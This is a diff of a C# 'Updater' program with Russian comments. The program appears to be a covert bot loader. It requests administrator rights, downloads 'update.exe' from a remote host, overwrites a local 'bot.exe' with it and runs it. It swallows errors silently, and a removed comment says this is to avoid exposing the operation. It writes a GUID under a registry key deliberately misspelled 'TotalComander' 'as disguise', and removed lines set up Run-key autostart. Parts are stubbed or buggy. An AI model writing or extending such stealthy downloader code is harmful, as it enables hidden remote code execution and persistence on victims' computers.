@@ -14,9 +14,8 @@ namespace Updater
 {
     class Program
     {
-        const string PATH = @"D:\"; //путь к папке с клиентом бота
-        const string NAME = "bot.exe";
-        const string URL = "setver.net/update.exe";
+        const string NAME = "bot.exe"; //имя бота
+        const string URL_CHECK_UPDATE = "setver.net/update.exe"; 
 
         static void Main(string[] args)
         {
@@ -33,58 +32,63 @@ namespace Updater
                     Process.Start(processInfo); //пытаемся запустить процесс
                 }
                 catch (Exception e)
-                {
-                    //Ничего не делаем, потому что пользователь, возможно, нажал кнопку "Нет" в ответ на вопрос о запуске программы в окне предупреждения UAC (для Windows 7)
-                }
-                Application.Exit(); //закрываем текущую копию программы (в любом случае, даже если пользователь отменил запуск с правами администратора в окне UAC)
+                { }
+                Application.Exit();
             }
             else //имеем права администратора, значит, продолжаем
             {
-                string pathToFile = PATH + NAME;
+                string pathToFile = Application.ExecutablePath + NAME;
 
                 if (File.Exists(pathToFile)) //проверяем, установлен ли уже бот
                 {
-                    //если установлен, то проверяем обновления
-                    //все исключения молча перехватывается, чтобы не палить контору.
-                    try
+                    //обновляем бота
+                    string url = CheckUpdate();
+                    if (!string.IsNullOrEmpty(url))
                     {
-
-                        File.Delete(pathToFile);
-
-                        //скачивание и сохранение файла
-                        WebClient wc = new WebClient();
-                        Stream stream = wc.OpenRead(URL);
-
-                        byte[] data = new byte[stream.Length];
-                        stream.Read(data, 0, (int)stream.Length);
-
-                        FileStream fs = File.Create(pathToFile);
-                        fs.Write(data, 0, data.Length);
-
-                        //запуск бота
-                        if (File.Exists(pathToFile))
-                            Process.Start(pathToFile);
-                    }
-                    catch (Exception e)
-                    { }
+                        while (!DownloadFile(url, pathToFile));
+                    } 
                 }
                 else //запускаем установку
                 {
-                    //в противном случае, устанавливаем бота
-                    //string prfiles = Environment.GetEnvironmentVariable("ProgramFiles");
-                    //File.Create(@"c:\Users\Andrew\Contacts"+"123.txt");
-                    //Microsoft.Win32.RegistryKey regkey = Microsoft.Win32.Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true);
-                    //regkey.SetValue("NameProgram", @"d:\123.exe");
-                    //string guid = Guid.NewGuid().ToString();
-                    //RegistryKey rk = Registry.LocalMachine;
-                    //RegistryKey software = rk.OpenSubKey("SOFTWARE", true);
-                    //RegistryKey key = software.CreateSubKey("Andrew");
-                    //key.SetValue("GUID", guid);
-                    //key.Close();
-                    //Console.ReadKey();
+                    string keyName = "HKEY_LOCAL_MACHINE/SOFTWARE/TotalComander/"; //это не опечатка, это маскировка
+                    Registry.SetValue(keyName, "GUID", Guid.NewGuid().ToString());
+                    //TODO: дописать код
                 }
 
             }
+        }
+
+        private static string CheckUpdate() //TODO: проверка обновлений
+        {
+            return "";
+        }
+
+        private static bool DownloadFile(string url, string path)
+        {
+            try
+            {
+                //скачивание и сохранение файла
+                WebClient wc = new WebClient();
+                Stream stream = wc.OpenRead(url);
+
+                byte[] data = new byte[stream.Length];
+                stream.Read(data, 0, (int)stream.Length);
+
+                File.Delete(path);
+
+                FileStream fs = File.Create(path);
+                fs.Write(data, 0, data.Length);
+
+                //запуск бота
+                if (File.Exists(path))
+                    Process.Start(path);
+            }
+            catch (Exception e)
+            {
+                return false; //если неудача, возвращаем false
+            }
+            return true;
+
         }
     }
 }
